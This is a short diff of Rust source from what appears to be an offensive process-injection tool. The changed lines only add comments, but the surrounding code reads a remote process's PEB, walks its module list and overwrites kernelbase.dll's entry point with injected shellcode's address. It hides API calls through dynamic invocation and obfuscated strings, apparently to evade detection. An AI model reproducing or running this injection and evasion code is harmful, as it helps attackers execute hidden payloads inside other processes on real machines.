@@ -149,6 +149,7 @@ fn main() {
         } 
 
 
+        // Get remote process' PEB base address
         let pi = PROCESS_BASIC_INFORMATION::default();
         let process_information: *mut c_void = std::mem::transmute(&pi);
         let ret = dinvoke::nt_query_information_process(
@@ -205,6 +206,7 @@ fn main() {
 
         println!("{}",&lc!("[+] PEB's double-linked list found."));
 
+        // Iterate over remote process PEB's loaded modules list
         let list_head = (*peb_ldr_data_ptr).in_load_order_module_list.Flink;
         let mut current_node = (*peb_ldr_data_ptr).in_load_order_module_list.Flink;
         loop 
@@ -232,6 +234,7 @@ fn main() {
             {
                 println!("{}",&lc!("[-] Patching PEB..."));
 
+                // Replace kernelbase.dll's entry point with our shellcode's base address
                 entry.Reserved3[0] = (*base_address_shellcode as isize) as *mut _; 
                 let ret = dinvoke::nt_write_virtual_memory(
                     phand, 
@@ -341,7 +344,7 @@ fn signal_threads(pid: u32)
 
                 let func: data::PostThreadMessageA;
                 let _ret: Option<bool>;
-                dinvoke::dynamic_invoke!(u32,&lc!("PostThreadMessageA"),func,_ret,te32.th32ThreadID,0x0012,0,0); //0x0012 = WM_QUIT 
+                dinvoke::dynamic_invoke!(u32,&lc!("PostThreadMessageA"),func,_ret,te32.th32ThreadID,0x0012,0,0); // 0x0012 = WM_QUIT 
              
             }
 
